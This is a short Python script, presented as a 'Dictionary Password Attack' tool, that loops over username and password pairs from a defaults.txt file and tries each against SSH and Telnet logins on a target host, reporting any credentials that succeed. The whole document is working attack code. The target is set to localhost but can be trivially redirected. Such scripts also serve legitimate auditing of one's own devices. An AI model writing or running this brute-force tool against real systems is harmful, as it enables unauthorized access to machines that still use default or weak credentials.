print("""
╔══════════════════════════════════════════════════════════╗
║    _         _   _                _   _      _ _         ║
║   / \  _   _| |_| |__   ___ _ __ | |_(_) ___(_) |_ _   _ ║
║  / _ \| | | | __| '_ \ / _ \ '_ \| __| |/ __| | __| | | |║
║ / ___ \ |_| | |_| | | |  __/ | | | |_| | (__| | |_| |_| |║
║/_/   \_\__,_|\__|_| |_|\___|_| |_|\__|_|\___|_|\__|\__, |║
║                                                    |___/ ║
╚══════════════════════════════════════════════════════════╝
""")

print("                       Authenticity")			 
print("               Dictionary Password Attack v0.1")
print("                    Author: Vyreth")

# Import the SSH and Telnet libraries
import paramiko
import telnetlib

# Function to try logging in with SSH
def SSHLogin(host, port, username, password):
    try:
        # Set up an SSH client and connect to the host
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port=port, username=username, password=password)
        # Try opening a session after connecting
        ssh_session = ssh.get_transport().open_session()
        if ssh_session.active:
            # If session is active, login worked
            print(f"SSH login successful on {host}:{port} with username '{username}' and password '{password}'")
    except Exception as e:
        # If login fails or error happens, skip it
        return
    # Close the SSH connection
    ssh.close()

# Function to try logging in with Telnet
def TelnetLogin(host, port, username, password):
    # Convert username and password to bytes
    user = bytes(username + "\n", "utf-8")
    passwd = bytes(password + "\n", "utf-8")

    # Connect to the host using Telnet
    tn = telnetlib.Telnet(host, port)
    tn.read_until(bytes("login:", "utf-8"))
    tn.write(user)
    tn.read_until(bytes("Password: ", "utf-8"))
    tn.write(passwd)
    try:
        # Wait for the response to see if login worked
        result = tn.expect([bytes("Last login", "utf-8")], timeout=2)
        if (result[0] >= 0):
            # If expected text is found, login succeeded
            print(f"Telnet login successful on {host}:{port} with username '{username}' and password '{password}'")
        # Close the Telnet connection
        tn.close()
    except EOFError:
        # If login fails, print a message
        print(f"Login failed with username '{username}' and password '{password}'")

# Set the target IP address (localhost in this case)
host = "127.0.0.1"

# Open the defaults.txt file which has a list of usernames and passwords
with open("defaults.txt","r") as f:
    # Read each line in the file
    for line in f:
        # Split the line into username and password
        vals = line.split()
        username = vals[0].strip()
        password = vals[1].strip()
        # Try SSH login with the current credentials
        SSHLogin(host, 22, username, password)
        # Try Telnet login with the current credentials
        TelnetLogin(host, 23, username, password)